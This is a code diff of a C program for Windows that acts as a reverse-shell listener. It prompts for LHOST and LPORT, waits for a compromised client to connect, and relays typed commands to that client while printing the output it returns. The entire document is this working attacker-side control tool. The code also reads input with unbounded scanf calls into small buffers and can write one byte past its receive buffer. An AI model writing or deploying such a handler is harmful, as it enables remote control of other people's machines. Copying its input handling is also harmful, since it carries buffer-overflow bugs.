@@ -2,97 +2,108 @@
 #include <stdlib.h>
 #include <string.h>
 #include <winsock2.h>
+#include <windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
-void main() {
-    WSADATA wsa;
-    SOCKET server_socket, client_socket;
-    struct sockaddr_in server_addr, client_addr;
-    int client_len = sizeof(client_addr);
-    char *ip;
-    int port;
+void handleClient(SOCKET clientSocket) {
+    char buffer[1024];
+    int bytesReceived;
+
+    while (1) {
+        // Display prompt to enter a command
+        printf("Shell> ");
+        memset(buffer, 0, sizeof(buffer));
+
+        // Get command input from user
+        if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
+            break;
+        }
+
+        // Send the command to the client
+        send(clientSocket, buffer, strlen(buffer), 0);
+
+        // Receive the output from the client
+        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
+        if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
+            printf("Connection closed or error receiving data.\n");
+            break;
+        }
+
+        // Print the output
+        buffer[bytesReceived] = '\0';
+        printf("%s\n", buffer);
+    }
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET serverSocket, clientSocket;
+    struct sockaddr_in serverAddr, clientAddr;
+    int clientAddrSize = sizeof(clientAddr);
+    char lhost[20], lport[10];
 
     // Initialize Winsock
-    printf("Initializing Winsock...\n");
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        printf("WSAStartup failed. Error code: %d\n", WSAGetLastError());
-        return;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("Winsock initialization failed\n");
+        return 1;
     }
 
-    // Prompt for LHOST and LPORT
-    printf("ENTER LHOST: ");
-    ip = (char *)malloc(16);
-    fgets(ip, 16, stdin);
-    ip[strcspn(ip, "\n")] = '\0';  // Remove newline character
+    // Get LHOST and LPORT from the user
+    printf("Enter LHOST: ");
+    scanf("%s", lhost);
+    printf("Enter LPORT: ");
+    scanf("%s", lport);
 
-    printf("ENTER LPORT: ");
-    scanf("%d", &port);
-
-    // Create a socket
-    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-        printf("Socket creation failed. Error code: %d\n", WSAGetLastError());
-        return;
+    // Create the socket
+    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (serverSocket == INVALID_SOCKET) {
+        printf("Socket creation failed\n");
+        WSACleanup();
+        return 1;
     }
 
-    // Set up server address structure
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_addr.s_addr = inet_addr(ip);
-    server_addr.sin_port = htons(port);
+    // Set up the server address
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(lhost);
+    serverAddr.sin_port = htons(atoi(lport));
 
     // Bind the socket
-    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
-        printf("Bind failed. Error code: %d\n", WSAGetLastError());
-        return;
+    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        printf("Bind failed\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
     }
 
     // Start listening
-    if (listen(server_socket, 3) == SOCKET_ERROR) {
-        printf("Listen failed. Error code: %d\n", WSAGetLastError());
-        return;
+    if (listen(serverSocket, 1) == SOCKET_ERROR) {
+        printf("Listen failed\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
     }
 
     printf("Listening...\n");
 
-    // Accept a client connection
-    if ((client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len)) == INVALID_SOCKET) {
-        printf("Accept failed. Error code: %d\n", WSAGetLastError());
-        return;
+    // Accept a connection
+    clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientAddrSize);
+    if (clientSocket == INVALID_SOCKET) {
+        printf("Accept failed\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
     }
 
-    // Command execution loop
-    char buffer[1024];
-    int recv_size;
-    while (1) {
-        memset(buffer, 0, sizeof(buffer));
-        printf("Shell> ");
-        fgets(buffer, sizeof(buffer), stdin);
+    printf("Client connected\n");
 
-        // Send the command to the client
-        send(client_socket, buffer, strlen(buffer), 0);
+    // Handle communication with the client
+    handleClient(clientSocket);
 
-        // Receive the output from the client
-        recv_size = recv(client_socket, buffer, sizeof(buffer), 0);
-        if (recv_size == SOCKET_ERROR) {
-            int error_code = WSAGetLastError();
-            if (error_code == WSAECONNRESET) {
-                printf("Connection reset by peer. The client may have closed the connection.\n");
-            } else {
-                printf("Recv failed. Error code: %d\n", error_code);
-            }
-            break;
-        }
-
-        if (recv_size == 0) {
-            printf("Client closed the connection.\n");
-            break;
-        }
-
-        buffer[recv_size] = '\0';
-        printf("%s", buffer);
-    }
-
-    closesocket(client_socket);
-    closesocket(server_socket);
+    // Clean up
+    closesocket(clientSocket);
+    closesocket(serverSocket);
     WSACleanup();
+    return 0;
 }
